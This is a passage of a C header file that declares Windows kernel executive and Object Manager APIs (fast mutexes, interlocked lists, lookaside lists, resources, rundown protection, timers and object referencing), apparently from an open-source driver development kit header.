#define ExAcquireSpinLockAtDpcLevel(Lock) KeAcquireSpinLockAtDpcLevel(Lock)
#define ExReleaseSpinLockFromDpcLevel(Lock) KeReleaseSpinLockFromDpcLevel(Lock)

#define ExInitializeSListHead InitializeSListHead

#if defined(_NTHAL_) && defined(_X86_)

NTKERNELAPI
VOID
FASTCALL
ExiAcquireFastMutex(
  IN OUT PFAST_MUTEX FastMutex);

NTKERNELAPI
VOID
FASTCALL
ExiReleaseFastMutex(
  IN OUT PFAST_MUTEX FastMutex);

NTKERNELAPI
BOOLEAN
FASTCALL
ExiTryToAcquireFastMutex(
    IN OUT PFAST_MUTEX FastMutex);

#define ExAcquireFastMutex ExiAcquireFastMutex
#define ExReleaseFastMutex ExiReleaseFastMutex
#define ExTryToAcquireFastMutex ExiTryToAcquireFastMutex

#else

#if (NTDDI_VERSION >= NTDDI_WIN2K)

NTKERNELAPI
VOID
FASTCALL
ExAcquireFastMutex(
  IN OUT PFAST_MUTEX FastMutex);

NTKERNELAPI
VOID
FASTCALL
ExReleaseFastMutex(
  IN OUT PFAST_MUTEX FastMutex);

NTKERNELAPI
BOOLEAN
FASTCALL
ExTryToAcquireFastMutex(
  IN OUT PFAST_MUTEX FastMutex);

#endif /* (NTDDI_VERSION >= NTDDI_WIN2K) */

#endif /* defined(_NTHAL_) && defined(_X86_) */

#if defined(_X86_)
#define ExInterlockedAddUlong ExfInterlockedAddUlong
#define ExInterlockedInsertHeadList ExfInterlockedInsertHeadList
#define ExInterlockedInsertTailList ExfInterlockedInsertTailList
#define ExInterlockedRemoveHeadList ExfInterlockedRemoveHeadList
#define ExInterlockedPopEntryList ExfInterlockedPopEntryList
#define ExInterlockedPushEntryList ExfInterlockedPushEntryList
#endif /* defined(_X86_) */

#if defined(_WIN64)

#if defined(_NTDRIVER_) || defined(_NTDDK_) || defined(_NTIFS_) || \
    defined(_NTHAL_) || defined(_NTOSP_)
NTKERNELAPI
USHORT
ExQueryDepthSList(IN PSLIST_HEADER ListHead);
#else
FORCEINLINE
USHORT
ExQueryDepthSList(IN PSLIST_HEADER ListHead)
{
  return (USHORT)(ListHead->Alignment & 0xffff);
}
#endif

NTKERNELAPI
PSLIST_ENTRY
ExpInterlockedFlushSList(
  PSLIST_HEADER ListHead);

NTKERNELAPI
PSLIST_ENTRY
ExpInterlockedPopEntrySList(
  PSLIST_HEADER ListHead);

NTKERNELAPI
PSLIST_ENTRY
ExpInterlockedPushEntrySList(
  PSLIST_HEADER ListHead,
  PSLIST_ENTRY ListEntry);

#define ExInterlockedFlushSList(Head) \
    ExpInterlockedFlushSList(Head)
#define ExInterlockedPopEntrySList(Head, Lock) \
    ExpInterlockedPopEntrySList(Head)
#define ExInterlockedPushEntrySList(Head, Entry, Lock) \
    ExpInterlockedPushEntrySList(Head, Entry)

#else /* !defined(_WIN64) */

#ifdef NONAMELESSUNION
#define ExQueryDepthSList(listhead) (listhead)->s.Depth
#else
#define ExQueryDepthSList(listhead) (listhead)->Depth
#endif

NTKERNELAPI
PSINGLE_LIST_ENTRY
FASTCALL
ExInterlockedFlushSList(
  IN OUT PSLIST_HEADER ListHead);

#endif /* !defined(_WIN64) */

#if defined(_WIN2K_COMPAT_SLIST_USAGE) && defined(_X86_)

NTKERNELAPI
PSINGLE_LIST_ENTRY 
FASTCALL
ExInterlockedPopEntrySList(
  IN PSLIST_HEADER ListHead,
  IN PKSPIN_LOCK Lock);

NTKERNELAPI
PSINGLE_LIST_ENTRY 
FASTCALL
ExInterlockedPushEntrySList(
  IN PSLIST_HEADER ListHead,
  IN PSINGLE_LIST_ENTRY ListEntry,
  IN PKSPIN_LOCK Lock);

NTKERNELAPI
PVOID
NTAPI
ExAllocateFromPagedLookasideList(
  IN OUT PPAGED_LOOKASIDE_LIST Lookaside);

NTKERNELAPI
VOID
NTAPI
ExFreeToPagedLookasideList(
  IN OUT PPAGED_LOOKASIDE_LIST Lookaside,
  IN PVOID Entry);

#else /* !_WIN2K_COMPAT_SLIST_USAGE */

#if !defined(_WIN64)
#define ExInterlockedPopEntrySList(_ListHead, _Lock) \
    InterlockedPopEntrySList(_ListHead)
#define ExInterlockedPushEntrySList(_ListHead, _ListEntry, _Lock) \
    InterlockedPushEntrySList(_ListHead, _ListEntry)
#endif

static __inline
PVOID
ExAllocateFromPagedLookasideList(
  IN OUT PPAGED_LOOKASIDE_LIST Lookaside)
{
  PVOID Entry;

  Lookaside->L.TotalAllocates++;
#ifdef NONAMELESSUNION
  Entry = InterlockedPopEntrySList(&Lookaside->L.u.ListHead);
  if (Entry == NULL) {
    Lookaside->L.u2.AllocateMisses++;
    Entry = (Lookaside->L.u4.Allocate)(Lookaside->L.Type,
                                       Lookaside->L.Size,
                                       Lookaside->L.Tag);
  }
#else /* NONAMELESSUNION */
  Entry = InterlockedPopEntrySList(&Lookaside->L.ListHead);
  if (Entry == NULL) {
    Lookaside->L.AllocateMisses++;
    Entry = (Lookaside->L.Allocate)(Lookaside->L.Type,
                                    Lookaside->L.Size,
                                    Lookaside->L.Tag);
  }
#endif /* NONAMELESSUNION */
  return Entry;
}

static __inline
VOID
ExFreeToPagedLookasideList(
  IN OUT PPAGED_LOOKASIDE_LIST Lookaside,
  IN PVOID Entry)
{
  Lookaside->L.TotalFrees++;
#ifdef NONAMELESSUNION
  if (ExQueryDepthSList(&Lookaside->L.u.ListHead) >= Lookaside->L.Depth) {
    Lookaside->L.u3.FreeMisses++;
    (Lookaside->L.u5.Free)(Entry);
  } else {
    InterlockedPushEntrySList(&Lookaside->L.u.ListHead, (PSLIST_ENTRY)Entry);
  }
#else /* NONAMELESSUNION */
  if (ExQueryDepthSList(&Lookaside->L.ListHead) >= Lookaside->L.Depth) {
    Lookaside->L.FreeMisses++;
    (Lookaside->L.Free)(Entry);
  } else {
    InterlockedPushEntrySList(&Lookaside->L.ListHead, (PSLIST_ENTRY)Entry);
  }
#endif /* NONAMELESSUNION */
}

#endif /* _WIN2K_COMPAT_SLIST_USAGE */


/* ERESOURCE_THREAD
 * ExGetCurrentResourceThread(
 *     VOID);
 */
#define ExGetCurrentResourceThread() ((ULONG_PTR)PsGetCurrentThread())

#define ExReleaseResource(R) (ExReleaseResourceLite(R))

/* VOID
 * ExInitializeWorkItem(
 *     IN PWORK_QUEUE_ITEM Item,
 *     IN PWORKER_THREAD_ROUTINE Routine,
 *     IN PVOID Context)
 */
#define ExInitializeWorkItem(Item, Routine, Context) \
{ \
  (Item)->WorkerRoutine = Routine; \
  (Item)->Parameter = Context; \
  (Item)->List.Flink = NULL; \
}

FORCEINLINE
VOID
ExInitializeFastMutex(
  OUT PFAST_MUTEX FastMutex)
{
  FastMutex->Count = FM_LOCK_BIT;
  FastMutex->Owner = NULL;
  FastMutex->Contention = 0;
  KeInitializeEvent(&FastMutex->Event, SynchronizationEvent, FALSE);
  return;
}

typedef void *PEXT_CANCEL_PARAMETERS;

typedef void (NTAPI EXT_DELETE_CALLBACK)(void *context);
typedef EXT_DELETE_CALLBACK *PEXT_DELETE_CALLBACK;

typedef struct _EXT_DELETE_PARAMETERS
{
    ULONG Version;
    ULONG Reserved;
    PEXT_DELETE_CALLBACK DeleteCallback;
    void *DeleteContext;
} EXT_DELETE_PARAMETERS, *PEXT_DELETE_PARAMETERS;

#if (NTDDI_VERSION >= NTDDI_WIN2K)

typedef struct _EX_TIMER *PEX_TIMER;

typedef void (NTAPI EXT_CALLBACK)(PEX_TIMER, PVOID);
typedef EXT_CALLBACK *PEXT_CALLBACK;

NTKERNELAPI
VOID
FASTCALL
ExAcquireFastMutexUnsafe(
  IN OUT PFAST_MUTEX FastMutex);

NTKERNELAPI
VOID
FASTCALL
ExReleaseFastMutexUnsafe(
  IN OUT PFAST_MUTEX FastMutex);

NTKERNELAPI
BOOLEAN
NTAPI
ExAcquireResourceExclusiveLite(
  IN OUT PERESOURCE Resource,
  IN BOOLEAN Wait);

NTKERNELAPI
BOOLEAN
NTAPI
ExAcquireResourceSharedLite(
  IN OUT PERESOURCE Resource,
  IN BOOLEAN Wait);

NTKERNELAPI
BOOLEAN
NTAPI
ExAcquireSharedStarveExclusive(
  IN OUT PERESOURCE Resource,
  IN BOOLEAN Wait);

NTKERNELAPI
BOOLEAN
NTAPI
ExAcquireSharedWaitForExclusive(
  IN OUT PERESOURCE Resource,
  IN BOOLEAN Wait);

NTKERNELAPI
PVOID
NTAPI
ExAllocatePool(
  IN POOL_TYPE PoolType,
  IN SIZE_T NumberOfBytes);

NTKERNELAPI
PVOID
NTAPI
ExAllocatePoolWithQuota(
  IN POOL_TYPE PoolType,
  IN SIZE_T NumberOfBytes);

NTKERNELAPI
PVOID
NTAPI
ExAllocatePoolWithQuotaTag(
  IN POOL_TYPE PoolType,
  IN SIZE_T NumberOfBytes,
  IN ULONG Tag);

#ifndef POOL_TAGGING
#define ExAllocatePoolWithQuotaTag(a,b,c) ExAllocatePoolWithQuota(a,b)
#endif

NTKERNELAPI
PVOID
NTAPI
ExAllocatePoolWithTag(
  IN POOL_TYPE PoolType,
  IN SIZE_T NumberOfBytes,
  IN ULONG Tag);

#ifndef POOL_TAGGING
#define ExAllocatePoolWithTag(a,b,c) ExAllocatePool(a,b)
#endif

NTKERNELAPI
PVOID
NTAPI
ExAllocatePoolWithTagPriority(
  IN POOL_TYPE PoolType,
  IN SIZE_T NumberOfBytes,
  IN ULONG Tag,
  IN EX_POOL_PRIORITY Priority);

NTKERNELAPI
VOID
NTAPI
ExConvertExclusiveToSharedLite(
  IN OUT PERESOURCE Resource);

NTKERNELAPI
NTSTATUS
NTAPI
ExCreateCallback(
  OUT PCALLBACK_OBJECT *CallbackObject,
  IN POBJECT_ATTRIBUTES ObjectAttributes,
  IN BOOLEAN Create,
  IN BOOLEAN AllowMultipleCallbacks);

NTKERNELAPI
VOID
NTAPI
ExDeleteNPagedLookasideList(
  IN OUT PNPAGED_LOOKASIDE_LIST Lookaside);

NTKERNELAPI
VOID
NTAPI
ExDeletePagedLookasideList(
  IN PPAGED_LOOKASIDE_LIST Lookaside);

NTKERNELAPI
NTSTATUS
NTAPI
ExDeleteResourceLite(
  IN OUT PERESOURCE Resource);

NTKERNELAPI
VOID
NTAPI
ExFreePool(
  IN PVOID P);

NTKERNELAPI
VOID
NTAPI
ExFreePoolWithTag(
  IN PVOID P,
  IN ULONG Tag);

NTKERNELAPI
ULONG
NTAPI
ExGetExclusiveWaiterCount(
  IN PERESOURCE Resource);

NTKERNELAPI
KPROCESSOR_MODE
NTAPI
ExGetPreviousMode(VOID);

NTKERNELAPI
ULONG
NTAPI
ExGetSharedWaiterCount(
  IN PERESOURCE Resource);

NTKERNELAPI
VOID
NTAPI
ExInitializeNPagedLookasideList(
  IN PNPAGED_LOOKASIDE_LIST Lookaside,
  IN PALLOCATE_FUNCTION Allocate OPTIONAL,
  IN PFREE_FUNCTION Free OPTIONAL,
  IN ULONG Flags,
  IN SIZE_T Size,
  IN ULONG Tag,
  IN USHORT Depth);

NTKERNELAPI
VOID
NTAPI
ExInitializePagedLookasideList(
  IN PPAGED_LOOKASIDE_LIST Lookaside,
  IN PALLOCATE_FUNCTION Allocate OPTIONAL,
  IN PFREE_FUNCTION Free OPTIONAL,
  IN ULONG Flags,
  IN SIZE_T Size,
  IN ULONG Tag,
  IN USHORT Depth);

NTKERNELAPI
NTSTATUS
NTAPI
ExInitializeResourceLite(
  OUT PERESOURCE Resource);

NTKERNELAPI
LARGE_INTEGER
NTAPI
ExInterlockedAddLargeInteger(
  IN PLARGE_INTEGER Addend,
  IN LARGE_INTEGER Increment,
  IN PKSPIN_LOCK Lock);

#if defined(_WIN64)
#define ExInterlockedAddLargeStatistic(Addend, Increment) \
    (VOID)InterlockedAdd64(&(Addend)->QuadPart, Increment)
#else
#define ExInterlockedAddLargeStatistic(Addend, Increment) \
    _InterlockedAddLargeStatistic((PLONGLONG)&(Addend)->QuadPart, Increment)
#endif

NTKERNELAPI
ULONG
FASTCALL
ExInterlockedAddUlong(
  IN PULONG Addend,
  IN ULONG Increment,
  IN OUT PKSPIN_LOCK Lock);

#if defined(_AMD64_) || defined(_IA64_)

#define ExInterlockedCompareExchange64(Destination, Exchange, Comperand, Lock) \
    InterlockedCompareExchange64(Destination, *(Exchange), *(Comperand))

#elif defined(_X86_)

NTKERNELAPI
LONGLONG
FASTCALL
ExfInterlockedCompareExchange64(
  IN OUT LONGLONG volatile *Destination,
  IN PLONGLONG Exchange,
  IN PLONGLONG Comperand);

#define ExInterlockedCompareExchange64(Destination, Exchange, Comperand, Lock) \
    ExfInterlockedCompareExchange64(Destination, Exchange, Comperand)

#else

NTKERNELAPI
LONGLONG
FASTCALL
ExInterlockedCompareExchange64(
  IN OUT LONGLONG volatile *Destination,
  IN PLONGLONG Exchange,
  IN PLONGLONG Comparand,
  IN PKSPIN_LOCK Lock);

#endif /* defined(_AMD64_) || defined(_IA64_) */

NTKERNELAPI
PLIST_ENTRY
FASTCALL
ExInterlockedInsertHeadList(
  IN OUT PLIST_ENTRY ListHead,
  IN OUT PLIST_ENTRY ListEntry,
  IN OUT PKSPIN_LOCK Lock);

NTKERNELAPI
PLIST_ENTRY
FASTCALL
ExInterlockedInsertTailList(
  IN OUT PLIST_ENTRY ListHead,
  IN OUT PLIST_ENTRY ListEntry,
  IN OUT PKSPIN_LOCK Lock);

NTKERNELAPI
PSINGLE_LIST_ENTRY
FASTCALL
ExInterlockedPopEntryList(
  IN OUT PSINGLE_LIST_ENTRY ListHead,
  IN OUT PKSPIN_LOCK Lock);

NTKERNELAPI
PSINGLE_LIST_ENTRY
FASTCALL
ExInterlockedPushEntryList(
  IN OUT PSINGLE_LIST_ENTRY ListHead,
  IN OUT PSINGLE_LIST_ENTRY ListEntry,
  IN OUT PKSPIN_LOCK Lock);

NTKERNELAPI
PLIST_ENTRY
FASTCALL
ExInterlockedRemoveHeadList(
  IN OUT PLIST_ENTRY ListHead,
  IN OUT PKSPIN_LOCK Lock);

NTKERNELAPI
BOOLEAN
NTAPI
ExIsProcessorFeaturePresent(
  IN ULONG ProcessorFeature);

NTKERNELAPI
BOOLEAN
NTAPI
ExIsResourceAcquiredExclusiveLite(
  IN PERESOURCE Resource);

NTKERNELAPI
ULONG
NTAPI
ExIsResourceAcquiredSharedLite(
  IN PERESOURCE Resource);

#define ExIsResourceAcquiredLite ExIsResourceAcquiredSharedLite

NTKERNELAPI
VOID
NTAPI
ExLocalTimeToSystemTime(
  IN PLARGE_INTEGER LocalTime,
  OUT PLARGE_INTEGER SystemTime);

NTKERNELAPI
VOID
NTAPI
ExNotifyCallback(
  IN PCALLBACK_OBJECT CallbackObject,
  IN PVOID Argument1 OPTIONAL,
  IN PVOID Argument2 OPTIONAL);

NTKERNELAPI
VOID
NTAPI
ExQueueWorkItem(
  IN OUT PWORK_QUEUE_ITEM WorkItem,
  IN WORK_QUEUE_TYPE QueueType);

NTKERNELAPI
DECLSPEC_NORETURN
VOID
NTAPI
ExRaiseStatus(
  IN NTSTATUS Status);

NTKERNELAPI
PVOID
NTAPI
ExRegisterCallback(
  IN PCALLBACK_OBJECT CallbackObject,
  IN PCALLBACK_FUNCTION CallbackFunction,
  IN PVOID CallbackContext OPTIONAL);

NTKERNELAPI
NTSTATUS
NTAPI
ExReinitializeResourceLite(
  IN OUT PERESOURCE Resource);

NTKERNELAPI
VOID
NTAPI
ExReleaseResourceForThreadLite(
  IN OUT PERESOURCE Resource,
  IN ERESOURCE_THREAD ResourceThreadId);

NTKERNELAPI
VOID
FASTCALL
ExReleaseResourceLite(
  IN OUT PERESOURCE Resource);

NTKERNELAPI
VOID
NTAPI
ExSetResourceOwnerPointer(
  IN OUT PERESOURCE Resource,
  IN PVOID OwnerPointer);

NTKERNELAPI
ULONG
NTAPI
ExSetTimerResolution(
  IN ULONG DesiredTime,
  IN BOOLEAN SetResolution);

NTKERNELAPI
VOID
NTAPI
ExSystemTimeToLocalTime(
  IN PLARGE_INTEGER SystemTime,
  OUT PLARGE_INTEGER LocalTime);

NTKERNELAPI
VOID
NTAPI
ExUnregisterCallback(
  IN OUT PVOID CbRegistration);

#endif /* (NTDDI_VERSION >= NTDDI_WIN2K) */

#if (NTDDI_VERSION >= NTDDI_WINXP)

NTKERNELAPI
BOOLEAN
FASTCALL
ExAcquireRundownProtection(
  IN OUT PEX_RUNDOWN_REF RunRef);

NTKERNELAPI
VOID
FASTCALL
ExInitializeRundownProtection(
  OUT PEX_RUNDOWN_REF RunRef);

NTKERNELAPI
VOID
FASTCALL
ExReInitializeRundownProtection(
  IN OUT PEX_RUNDOWN_REF RunRef);

NTKERNELAPI
VOID
FASTCALL
ExReleaseRundownProtection(
  IN OUT PEX_RUNDOWN_REF RunRef);

NTKERNELAPI
VOID
FASTCALL
ExRundownCompleted(
  OUT PEX_RUNDOWN_REF RunRef);

NTKERNELAPI
BOOLEAN
NTAPI
ExVerifySuite(
  IN SUITE_TYPE SuiteType);

NTKERNELAPI
VOID
FASTCALL
ExWaitForRundownProtectionRelease(
  IN OUT PEX_RUNDOWN_REF RunRef);
#endif /* (NTDDI_VERSION >= NTDDI_WINXP) */

#if (NTDDI_VERSION >= NTDDI_WINXPSP2)

NTKERNELAPI
BOOLEAN
FASTCALL
ExAcquireRundownProtectionEx(
  IN OUT PEX_RUNDOWN_REF RunRef,
  IN ULONG Count);

NTKERNELAPI
VOID
FASTCALL
ExReleaseRundownProtectionEx(
  IN OUT PEX_RUNDOWN_REF RunRef,
  IN ULONG Count);

#endif /* (NTDDI_VERSION >= NTDDI_WINXPSP2) */

#if (NTDDI_VERSION >= NTDDI_WS03SP1)

NTKERNELAPI
PEX_RUNDOWN_REF_CACHE_AWARE
NTAPI
ExAllocateCacheAwareRundownProtection(
  IN POOL_TYPE PoolType,
  IN ULONG PoolTag);

NTKERNELAPI
SIZE_T
NTAPI
ExSizeOfRundownProtectionCacheAware(VOID);

NTKERNELAPI
PVOID
NTAPI
ExEnterCriticalRegionAndAcquireResourceShared(
  IN OUT PERESOURCE Resource);

NTKERNELAPI
PVOID
NTAPI
ExEnterCriticalRegionAndAcquireResourceExclusive(
  IN OUT PERESOURCE Resource);

NTKERNELAPI
PVOID
NTAPI
ExEnterCriticalRegionAndAcquireSharedWaitForExclusive(
  IN OUT PERESOURCE Resource);

NTKERNELAPI
VOID
FASTCALL
ExReleaseResourceAndLeaveCriticalRegion(
  IN OUT PERESOURCE Resource);

NTKERNELAPI
VOID
NTAPI
ExInitializeRundownProtectionCacheAware(
  OUT PEX_RUNDOWN_REF_CACHE_AWARE RunRefCacheAware,
  IN SIZE_T RunRefSize);

NTKERNELAPI
VOID
NTAPI
ExFreeCacheAwareRundownProtection(
  IN OUT PEX_RUNDOWN_REF_CACHE_AWARE RunRefCacheAware);

NTKERNELAPI
BOOLEAN
FASTCALL
ExAcquireRundownProtectionCacheAware(
  IN OUT PEX_RUNDOWN_REF_CACHE_AWARE RunRefCacheAware);

NTKERNELAPI
VOID
FASTCALL
ExReleaseRundownProtectionCacheAware(
  IN OUT PEX_RUNDOWN_REF_CACHE_AWARE RunRefCacheAware);

NTKERNELAPI
BOOLEAN
FASTCALL
ExAcquireRundownProtectionCacheAwareEx(
  IN OUT PEX_RUNDOWN_REF_CACHE_AWARE RunRefCacheAware,
  IN ULONG Count);

NTKERNELAPI
VOID
FASTCALL
ExReleaseRundownProtectionCacheAwareEx(
  IN OUT PEX_RUNDOWN_REF_CACHE_AWARE RunRef,
  IN ULONG Count);

NTKERNELAPI
VOID
FASTCALL
ExWaitForRundownProtectionReleaseCacheAware(
  IN OUT PEX_RUNDOWN_REF_CACHE_AWARE RunRef);

NTKERNELAPI
VOID
FASTCALL
ExReInitializeRundownProtectionCacheAware(
  IN OUT PEX_RUNDOWN_REF_CACHE_AWARE RunRefCacheAware);

NTKERNELAPI
VOID
FASTCALL
ExRundownCompletedCacheAware(
  IN OUT PEX_RUNDOWN_REF_CACHE_AWARE RunRefCacheAware);

#endif /* (NTDDI_VERSION >= NTDDI_WS03SP1) */

#if (NTDDI_VERSION >= NTDDI_VISTA)

NTKERNELAPI
NTSTATUS
NTAPI
ExInitializeLookasideListEx(
  OUT PLOOKASIDE_LIST_EX Lookaside,
  IN PALLOCATE_FUNCTION_EX Allocate OPTIONAL,
  IN PFREE_FUNCTION_EX Free OPTIONAL,
  IN POOL_TYPE PoolType,
  IN ULONG Flags,
  IN SIZE_T Size,
  IN ULONG Tag,
  IN USHORT Depth);

NTKERNELAPI
VOID
NTAPI
ExDeleteLookasideListEx(
  IN OUT PLOOKASIDE_LIST_EX Lookaside);

NTKERNELAPI
VOID
NTAPI
ExFlushLookasideListEx(
  IN OUT PLOOKASIDE_LIST_EX Lookaside);

FORCEINLINE
PVOID
ExAllocateFromLookasideListEx(
  IN OUT PLOOKASIDE_LIST_EX Lookaside)
{
  PVOID Entry;

  Lookaside->L.TotalAllocates += 1;
#ifdef NONAMELESSUNION
  Entry = InterlockedPopEntrySList(&Lookaside->L.u.ListHead);
  if (Entry == NULL) {
    Lookaside->L.u2.AllocateMisses += 1;
    Entry = (Lookaside->L.u4.AllocateEx)(Lookaside->L.Type,
                                         Lookaside->L.Size,
                                         Lookaside->L.Tag,
                                         Lookaside);
  }
#else /* NONAMELESSUNION */
  Entry = InterlockedPopEntrySList(&Lookaside->L.ListHead);
  if (Entry == NULL) {
    Lookaside->L.AllocateMisses += 1;
    Entry = (Lookaside->L.AllocateEx)(Lookaside->L.Type,
                                      Lookaside->L.Size,
                                      Lookaside->L.Tag,
                                      Lookaside);
  }
#endif /* NONAMELESSUNION */
  return Entry;
}

FORCEINLINE
VOID
ExFreeToLookasideListEx(
  IN OUT PLOOKASIDE_LIST_EX Lookaside,
  IN PVOID Entry)
{
  Lookaside->L.TotalFrees += 1;
  if (ExQueryDepthSList(&Lookaside->L.ListHead) >= Lookaside->L.Depth) {
    Lookaside->L.FreeMisses += 1;
    (Lookaside->L.FreeEx)(Entry, Lookaside);
  } else {
    InterlockedPushEntrySList(&Lookaside->L.ListHead, (PSLIST_ENTRY)Entry);
  }
  return;
}

#endif /* (NTDDI_VERSION >= NTDDI_VISTA) */

#if (NTDDI_VERSION >= NTDDI_WIN7)

typedef struct _EXT_SET_PARAMETERS_V0
{
    ULONG Version;
    ULONG Reserved;
    LONGLONG NoWakeTolerance;
} EXT_SET_PARAMETERS, *PEXT_SET_PARAMETERS, KT2_SET_PARAMETERS, *PKT2_SET_PARAMETERS;

NTKERNELAPI
VOID
NTAPI
ExSetResourceOwnerPointerEx(
  IN OUT PERESOURCE Resource,
  IN PVOID OwnerPointer,
  IN ULONG Flags);

#define FLAG_OWNER_POINTER_IS_THREAD 0x1

#endif /* (NTDDI_VERSION >= NTDDI_WIN7) */

#if NTDDI_VERSION >= NTDDI_WINBLUE

#define EX_TIMER_HIGH_RESOLUTION 4
#define EX_TIMER_NO_WAKE 8
#define EX_TIMER_UNLIMITED_TOLERANCE ((LONGLONG)-1)
#define EX_TIMER_NOTIFICATION (1ul << 31)

NTKERNELAPI PEX_TIMER NTAPI ExAllocateTimer(PEXT_CALLBACK callback, void *context, ULONG attr);
NTKERNELAPI BOOLEAN NTAPI ExCancelTimer(PEX_TIMER timer, PEXT_CANCEL_PARAMETERS params);
NTKERNELAPI BOOLEAN NTAPI ExDeleteTimer(PEX_TIMER timer, BOOLEAN cancel, BOOLEAN wait, PEXT_DELETE_PARAMETERS params);
NTKERNELAPI BOOLEAN NTAPI ExSetTimer(PEX_TIMER timer, LONGLONG due, LONGLONG period, EXT_SET_PARAMETERS *params);

FORCEINLINE void KeInitializeTimer2SetParameters(KT2_SET_PARAMETERS *params)
{
    memset(params, 0, sizeof(*params));
}

FORCEINLINE void ExInitializeSetTimerParameters(EXT_SET_PARAMETERS *params)
{
    KeInitializeTimer2SetParameters(params);
}

#endif

static __inline PVOID
ExAllocateFromNPagedLookasideList(
  IN OUT PNPAGED_LOOKASIDE_LIST Lookaside)
{
  PVOID Entry;

  Lookaside->L.TotalAllocates++;
#ifdef NONAMELESSUNION
#if defined(_WIN2K_COMPAT_SLIST_USAGE) && defined(_X86_)
  Entry = ExInterlockedPopEntrySList(&Lookaside->L.u.ListHead,
                                     &Lookaside->Lock__ObsoleteButDoNotDelete);
#else
  Entry = InterlockedPopEntrySList(&Lookaside->L.u.ListHead);
#endif
  if (Entry == NULL) {
    Lookaside->L.u2.AllocateMisses++;
    Entry = (Lookaside->L.u4.Allocate)(Lookaside->L.Type,
                                       Lookaside->L.Size,
                                       Lookaside->L.Tag);
  }
#else /* NONAMELESSUNION */
#if defined(_WIN2K_COMPAT_SLIST_USAGE) && defined(_X86_)
  Entry = ExInterlockedPopEntrySList(&Lookaside->L.ListHead,
                                     &Lookaside->Lock__ObsoleteButDoNotDelete);
#else
  Entry = InterlockedPopEntrySList(&Lookaside->L.ListHead);
#endif
  if (Entry == NULL) {
    Lookaside->L.AllocateMisses++;
    Entry = (Lookaside->L.Allocate)(Lookaside->L.Type,
                                    Lookaside->L.Size,
                                    Lookaside->L.Tag);
  }
#endif /* NONAMELESSUNION */
  return Entry;
}

static __inline VOID
ExFreeToNPagedLookasideList(
  IN OUT PNPAGED_LOOKASIDE_LIST Lookaside,
  IN PVOID Entry)
{
  Lookaside->L.TotalFrees++;
#ifdef NONAMELESSUNION
  if (ExQueryDepthSList(&Lookaside->L.u.ListHead) >= Lookaside->L.Depth) {
    Lookaside->L.u3.FreeMisses++;
    (Lookaside->L.u5.Free)(Entry);
  } else {
#if defined(_WIN2K_COMPAT_SLIST_USAGE) && defined(_X86_)
      ExInterlockedPushEntrySList(&Lookaside->L.u.ListHead,
                                  (PSLIST_ENTRY)Entry,
                                  &Lookaside->Lock__ObsoleteButDoNotDelete);
#else
      InterlockedPushEntrySList(&Lookaside->L.u.ListHead, (PSLIST_ENTRY)Entry);
#endif
   }
#else /* NONAMELESSUNION */
  if (ExQueryDepthSList(&Lookaside->L.ListHead) >= Lookaside->L.Depth) {
    Lookaside->L.FreeMisses++;
    (Lookaside->L.Free)(Entry);
  } else {
#if defined(_WIN2K_COMPAT_SLIST_USAGE) && defined(_X86_)
      ExInterlockedPushEntrySList(&Lookaside->L.ListHead,
                                  (PSLIST_ENTRY)Entry,
                                  &Lookaside->Lock__ObsoleteButDoNotDelete);
#else
      InterlockedPushEntrySList(&Lookaside->L.ListHead, (PSLIST_ENTRY)Entry);
#endif
   }
#endif /* NONAMELESSUNION */
}

/******************************************************************************
 *                          Object Manager Functions                          *
 ******************************************************************************/

#if (NTDDI_VERSION >= NTDDI_WIN2K)
NTKERNELAPI
LONG_PTR
FASTCALL
ObfDereferenceObject(
  IN PVOID Object);
#define ObDereferenceObject ObfDereferenceObject

NTKERNELAPI
NTSTATUS
NTAPI
ObGetObjectSecurity(
  IN PVOID Object,
  OUT PSECURITY_DESCRIPTOR *SecurityDescriptor,
  OUT PBOOLEAN MemoryAllocated);

NTKERNELAPI
LONG_PTR
FASTCALL
ObfReferenceObject(
  IN PVOID Object);
#define ObReferenceObject ObfReferenceObject

NTKERNELAPI
NTSTATUS
NTAPI
ObReferenceObjectByHandle(
  IN HANDLE Handle,
  IN ACCESS_MASK DesiredAccess,
  IN POBJECT_TYPE ObjectType OPTIONAL,
  IN KPROCESSOR_MODE AccessMode,
  OUT PVOID *Object,
  OUT POBJECT_HANDLE_INFORMATION HandleInformation OPTIONAL);

NTKERNELAPI
NTSTATUS
NTAPI
ObReferenceObjectByPointer(
  IN PVOID Object,
  IN ACCESS_MASK DesiredAccess,
  IN POBJECT_TYPE ObjectType OPTIONAL,
  IN KPROCESSOR_MODE AccessMode);

NTKERNELAPI
VOID
NTAPI
ObReleaseObjectSecurity(
  IN PSECURITY_DESCRIPTOR SecurityDescriptor,
  IN BOOLEAN MemoryAllocated);
#endif /* (NTDDI_VERSION >= NTDDI_WIN2K) */

#if (NTDDI_VERSION >= NTDDI_VISTA)
NTKERNELAPI
VOID
NTAPI
ObDereferenceObjectDeferDelete(
  IN PVOID Object);
#endif

#if (NTDDI_VERSION >= NTDDI_VISTASP1)
NTKERNELAPI
NTSTATUS
NTAPI
ObRegisterCallbacks(
  IN POB_CALLBACK_REGISTRATION CallbackRegistration,
  OUT PVOID *RegistrationHandle);

NTKERNELAPI
VOID
NTAPI
ObUnRegisterCallbacks(
  IN PVOID RegistrationHandle);

NTKERNELAPI
USHORT
NTAPI
ObGetFilterVersion(VOID);

#endif /* (NTDDI_VERSION >= NTDDI_VISTASP1) */

#if (NTDDI_VERSION >= NTDDI_WIN7)
NTKERNELAPI
NTSTATUS
NTAPI
ObReferenceObjectByHandleWithTag(
  IN HANDLE Handle,
  IN ACCESS_MASK DesiredAccess,
  IN POBJECT_TYPE ObjectType OPTIONAL,
  IN KPROCESSOR_MODE AccessMode,
  IN ULONG Tag,
  OUT PVOID *Object,
  OUT POBJECT_HANDLE_INFORMATION HandleInformation OPTIONAL);

NTKERNELAPI
LONG_PTR
FASTCALL
ObfReferenceObjectWithTag(
  IN PVOID Object,
  IN ULONG Tag);

NTKERNELAPI
NTSTATUS
NTAPI
ObReferenceObjectByPointerWithTag(
  IN PVOID Object,
  IN ACCESS_MASK DesiredAccess,
  IN POBJECT_TYPE ObjectType OPTIONAL,
  IN KPROCESSOR_MODE AccessMode,
  IN ULONG Tag);

NTKERNELAPI
LONG_PTR
FASTCALL
ObfDereferenceObjectWithTag(
  IN PVOID Object,
  IN ULONG Tag);

NTKERNELAPI
VOID
NTAPI
ObDereferenceObjectDeferDeleteWithTag(
  IN PVOID Object,
  IN ULONG Tag);

#define ObDereferenceObject ObfDereferenceObject
#define ObReferenceObject ObfReferenceObject
#define ObDereferenceObjectWithTag ObfDereferenceObjectWithTag
#define ObReferenceObjectWithTag ObfReferenceObjectWithTag
